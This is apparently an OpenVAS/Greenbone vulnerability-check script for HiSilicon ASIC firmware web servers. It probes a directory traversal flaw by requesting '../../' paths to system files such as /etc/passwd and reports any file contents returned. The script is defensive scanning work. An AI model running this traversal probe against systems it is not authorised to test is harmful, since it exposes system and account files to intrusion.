if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140171" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "HiSilicon ASIC Firmware Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "https://ssd-disclosure.com/archives/3025" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/44004" );
	script_tag( name: "vuldetect", value: "Try to read /etc/passwd." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product
  by another one." );
	script_tag( name: "summary", value: "HiSilicon ASIC firmware are prone to multiple vulnerabilities:

  1. Buffer overflow in built-in webserver

  2. Directory path traversal built-in webserver" );
	script_tag( name: "affected", value: "Vendors using the HiSilicon application-specific integrated circuit
  (ASIC) chip set in their products." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2017-02-22 10:07:23 +0100 (Wed, 22 Feb 2017)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "uc_httpd/banner" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "../../" + file;
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(egrep( string: buf, pattern: pattern )){
		report = "By requesting `" + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "` it was possible to read `/" + file + "`. Response:\n\n" + buf + "\n";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

